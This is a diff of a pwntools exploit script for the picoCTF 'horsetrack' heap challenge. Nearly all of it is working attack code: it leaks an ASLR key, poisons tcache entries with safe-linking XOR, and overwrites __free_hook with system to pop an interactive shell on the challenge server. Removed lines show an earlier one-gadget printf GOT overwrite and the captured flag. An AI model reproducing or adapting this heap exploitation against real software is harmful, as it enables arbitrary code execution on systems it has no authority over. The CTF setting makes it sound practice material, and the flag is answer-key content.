@@ -1,21 +1,13 @@
 from pwn import *
-#context.log_level = 'debug'
+context.log_level = 'debug'
 e = ELF('./horsetrack')
 libc = ELF('./libc.so.6')
 isRemote = True
-HOST = 'saturn.picoctf.net'
-#PORT = 49357
-PORT = 56177
-#isRemote = False
 if isRemote:
-    r = remote(HOST, PORT) 
-    # pwntools bug 
-    # https://github.com/Gallopsled/pwntools/pull/563
-    # fix: https://discord.com/channels/809590285687980052/809590285687980056/1089980004022095952 (in the pwntools discord server)
-    r.newline = b'\r\n'
+    r = remote('saturn.picoctf.net', 50299) 
 else:
     r = process('./horsetrack')
-    #r = gdb.debug('./horsetrack', 'b *0x00401c0c\nc')
+    #r = gdb.debug('./horsetrack', 'b system\nc')
 
 def add_horse(i, length, data):
     r.recvuntil(b'Choice: ')
@@ -32,8 +24,7 @@ def remove_horse(i):
 def race():
     r.recvuntil(b'Choice: ')
     r.sendline(b'3')
-    if isRemote: 
-        for _ in range(2): r.recvline() # socat does echoback
+    if isRemote: r.recvline()
 def do_exit():
     r.recvuntil(b'Choice: ')
     r.sendline(b'4')
@@ -58,8 +49,9 @@ while c[0] == 0x20:
     c = r.recv(1)
 key = u16(c+r.recv(1))
 print('aslr leak:', hex(key))
-remove_horse(0) # move horse 0 to stall 17
-add_horse(17, 16, b'\xff') # to clear the tcache bins
+
+# in preparation 
+add_horse(13, 16, b'/bin/sh\x00'+b'\xff')
 
 # has_cheated = false
 add_horse(5, 16, b'\xff')
@@ -91,28 +83,12 @@ add_horse(5, 16, b'\xff')
 add_horse(6, 16, b'\xff')
 remove_horse(5)
 remove_horse(6)
-cheat(6, 0, p64(e.got['printf']^key)+b'\xff')
-payload = b'' 
-one_gadget = p64(libc.address + 0xcad20)
-i = 0 
-while i < len(one_gadget) and one_gadget[i] != 0x7f:
-    payload += bytes([one_gadget[i]])
-    i += 1
-payload += b'\xff'
-print('got payload', payload)
-assert b'\x7f' not in payload
+cheat(6, 0, p64(libc.sym['__free_hook']^key)+b'\xff')
 add_horse(11, 16, b'\xff')
-add_horse(0, 16, payload+b'\xff') 
-# printf("Added horse to stable index %d", 0, 0);
-# rsi = 0, rdx = 0 by checking the disassembly 
+add_horse(12, 16, p64(e.plt['system'])+b'\xff')
+remove_horse(13)
 
 r.interactive()
-
-# not quite sure why this happens:
-#  : 1: \xff: not found
-# i'm guessing it's an artifact from the one-gadget 
-
-# flag: picoCTF{t_cache_4ll_th3_w4y_2_th4_b4nk_6112bbec}
 
 
 
